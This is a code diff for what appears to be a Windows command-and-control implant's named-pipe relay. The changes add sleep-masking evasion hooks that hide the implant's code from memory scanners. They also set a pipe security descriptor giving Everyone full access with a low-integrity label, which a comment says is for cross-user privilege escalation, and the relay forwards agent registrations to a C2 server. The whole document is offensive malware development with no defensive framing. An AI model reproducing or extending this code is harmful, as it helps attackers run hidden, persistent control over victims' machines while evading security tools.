@@ -14,6 +14,7 @@
 #include "transport.h"
 #include "crypto.h"
 #include "b64.h"
+#include "evasion.h"
 #include <windows.h>
 #include <stdlib.h>
 #include <string.h>
@@ -76,7 +77,7 @@ typedef struct {
     uint8_t aes_key[32];
 } ConnState;
 
-/* ── SDDL: Everyone (WD) gets read+write+create_instance on the pipe ────────── */
+/* ── SDDL: Everyone (WD) full access + Low-integrity SACL for cross-user privesc ── */
 
 static SECURITY_ATTRIBUTES* make_pipe_sa(void) {
     typedef BOOL (WINAPI *FnConvert)(LPCWSTR, DWORD, PSECURITY_DESCRIPTOR*, PULONG);
@@ -87,7 +88,10 @@ static SECURITY_ATTRIBUTES* make_pipe_sa(void) {
     FnConvert fn = (FnConvert)raw;
     if (!fn) return NULL;
 
-    wchar_t sddl[] = L"D:(A;;0x12019f;;;WD)";
+    /* S:(ML;;NW;;;LW) — Low-integrity SACL: allows processes at any integrity
+     * level (Low/Medium/High) to connect, needed for schtask batch-logon children.
+     * D:(A;;0x1f019f;;;WD) — DACL: Everyone (WD) full pipe access. */
+    wchar_t sddl[] = L"S:(ML;;NW;;;LW)D:(A;;0x1f019f;;;WD)";
     PSECURITY_DESCRIPTOR sd = NULL;
     if (!fn(sddl, 1 /*SDDL_REVISION_1*/, &sd, NULL) || !sd) return NULL;
 
@@ -181,6 +185,7 @@ ack:
 static DWORD WINAPI conn_thread(LPVOID arg) {
     ConnState *cs = (ConnState*)arg;
     HANDLE pipe   = cs->pipe;
+    int entered   = 0;   /* tracks whether evasion_conn_enter() was called */
 
     /* read REGISTER */
     size_t mlen = 0;
@@ -199,6 +204,11 @@ static DWORD WINAPI conn_thread(LPVOID arg) {
     agent_json_str((char*)msg, "os",       os_str,  sizeof(os_str));
     agent_json_str((char*)msg, "language", language, sizeof(language));
     free(msg);
+
+    /* Inhibit sleep masking now — the HTTP relay below and message loop both
+     * execute in .text; sleep_masked() must not set it PAGE_NOACCESS here. */
+    evasion_conn_enter();
+    entered = 1;
 
     /* forward registration to C2 */
     char reg[1024];
@@ -251,6 +261,7 @@ static DWORD WINAPI conn_thread(LPVOID arg) {
     }
 
 done:
+    if (entered) evasion_conn_leave();
     DisconnectNamedPipe(pipe);
     CloseHandle(pipe);
     free(cs);
@@ -285,6 +296,13 @@ static void ps_global_init(void) {
 
 static DWORD WINAPI accept_thread(LPVOID arg) {
     PipeServer *srv = (PipeServer*)arg;
+
+    /* Inhibit sleep masking for the entire accept loop — ConnectNamedPipe blocks
+     * in kernel, but on client connect it returns to user-space code in .text;
+     * if sleep_masked() has set .text PAGE_NOACCESS at that instant, we fault.
+     * Must be called BEFORE make_pipe_sa() so no .text code runs unprotected. */
+    evasion_conn_enter();
+
     SECURITY_ATTRIBUTES *sa = make_pipe_sa();
 
     wchar_t wname[256] = {0};
@@ -335,6 +353,7 @@ static DWORD WINAPI accept_thread(LPVOID arg) {
     }
 
     free_pipe_sa(sa);
+    evasion_conn_leave();
     return 0;
 }
 
